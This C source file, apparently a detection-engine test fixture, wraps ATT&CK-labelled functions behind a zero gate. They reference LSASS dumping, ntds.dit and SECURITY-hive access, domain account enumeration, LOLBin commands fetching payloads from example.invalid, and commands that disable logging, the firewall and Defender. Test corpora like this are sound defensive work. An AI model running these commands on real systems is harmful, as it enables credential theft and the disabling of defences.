/* Static-analysis regression fixture. Compile and inspect; never used as runtime evidence.
 * No capability function runs in the default executable. The volatile gate is zero.
 */
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <lm.h>
#include <setupapi.h>
#include <wlanapi.h>
#include <dbghelp.h>
#include <fwpmu.h>

static volatile int fixture_gate = 0;

static __attribute__((noinline)) void fixture_T1003_001(void) {
    OutputDebugStringA("lsass.exe"); MiniDumpWriteDump(NULL, 0, NULL, MiniDumpNormal, NULL, NULL, NULL);
}

static __attribute__((noinline)) void fixture_T1003_003(void) {
    CreateFileA("C:\\Windows\\NTDS\\ntds.dit", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
}

static __attribute__((noinline)) void fixture_T1003_004(void) {
    HKEY key; RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets\\Probe", 0, KEY_READ, &key);
}

static __attribute__((noinline)) void fixture_T1003_005(void) {
    HKEY key; RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", 0, KEY_READ, &key);
}

static __attribute__((noinline)) void fixture_T1006(void) {
    CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
}

static __attribute__((noinline)) void fixture_T1016_002(void) {
    WlanGetAvailableNetworkList(NULL, NULL, 0, NULL, NULL);
}

static __attribute__((noinline)) void fixture_T1070_005(void) {
    WNetCancelConnection2A("Z:", 0, FALSE);
}

static __attribute__((noinline)) void fixture_T1087_001(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "net.exe user"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1087_002(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "net.exe user /domain"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1069_002(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "net.exe group /domain"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1120(void) {
    SetupDiGetClassDevsA(NULL, NULL, NULL, DIGCF_ALLCLASSES); SetupDiEnumDeviceInfo(NULL, 0, NULL);
}

static __attribute__((noinline)) void fixture_T1124(void) {
    SYSTEMTIME time; GetSystemTime(&time);
}

static __attribute__((noinline)) void fixture_T1201(void) {
    LPBYTE buffer; NetUserModalsGet(NULL, 0, &buffer);
}

static __attribute__((noinline)) void fixture_T1134_002(void) {
    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi; CreateProcessWithTokenW(NULL, 0, NULL, NULL, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1059_010(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "AutoHotkey.exe C:\\stage\\probe.ahk"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_003(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "cmstp.exe /s C:\\stage\\probe.inf"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_004(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "InstallUtil.exe /U C:\\stage\\probe.dll"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_005(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "mshta.exe https://example.invalid/probe.hta"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_007(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "msiexec.exe /i https://example.invalid/probe.msi /qn"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_008(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "odbcconf.exe /a {REGSVR C:\\stage\\probe.dll}"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_009(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "RegAsm.exe C:\\stage\\probe.dll /codebase"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_010(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "regsvr32.exe /s /n /u /i:https://example.invalid/probe.sct scrobj.dll"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_011(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "rundll32.exe C:\\stage\\probe.dll,EntryPoint"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1218_013(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "mavinject.exe 1234 /INJECTRUNNING C:\\stage\\probe.dll"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1653(void) {
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
}

static __attribute__((noinline)) void fixture_T1654(void) {
    DWORD read, needed; char buffer[4096]; ReadEventLogA(NULL, EVENTLOG_SEQUENTIAL_READ | EVENTLOG_FORWARDS_READ, 0, buffer, sizeof(buffer), &read, &needed);
}

static __attribute__((noinline)) void fixture_T1674(void) {
    SendInput(0, NULL, sizeof(INPUT));
}

static __attribute__((noinline)) void fixture_T1680(void) {
    GetLogicalDrives();
}

static __attribute__((noinline)) void fixture_T1685_005(void) {
    ClearEventLogA(NULL, NULL);
}

static __attribute__((noinline)) void fixture_T1685_001(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "wevtutil.exe sl Security /e:false"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1686_003(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "netsh.exe advfirewall set allprofiles state off"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1688(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "bcdedit.exe /set {current} safeboot minimal"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1690(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "powershell.exe -NoProfile -Command \"Set-PSReadLineOption -HistorySaveStyle SaveNothing\""; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1685(void) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi; static char command[] = "sc.exe stop WinDefend"; CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

static __attribute__((noinline)) void fixture_T1686(void) {
    FwpmFilterDeleteById0(NULL, 1);
}

int main(void) {
    if (fixture_gate) {
        fixture_T1003_001();
        fixture_T1003_003();
        fixture_T1003_004();
        fixture_T1003_005();
        fixture_T1006();
        fixture_T1016_002();
        fixture_T1070_005();
        fixture_T1087_001();
        fixture_T1087_002();
        fixture_T1069_002();
        fixture_T1120();
        fixture_T1124();
        fixture_T1201();
        fixture_T1134_002();
        fixture_T1059_010();
        fixture_T1218_003();
        fixture_T1218_004();
        fixture_T1218_005();
        fixture_T1218_007();
        fixture_T1218_008();
        fixture_T1218_009();
        fixture_T1218_010();
        fixture_T1218_011();
        fixture_T1218_013();
        fixture_T1653();
        fixture_T1654();
        fixture_T1674();
        fixture_T1680();
        fixture_T1685_005();
        fixture_T1685_001();
        fixture_T1686_003();
        fixture_T1688();
        fixture_T1690();
        fixture_T1685();
        fixture_T1686();
    }
    return 0;
}
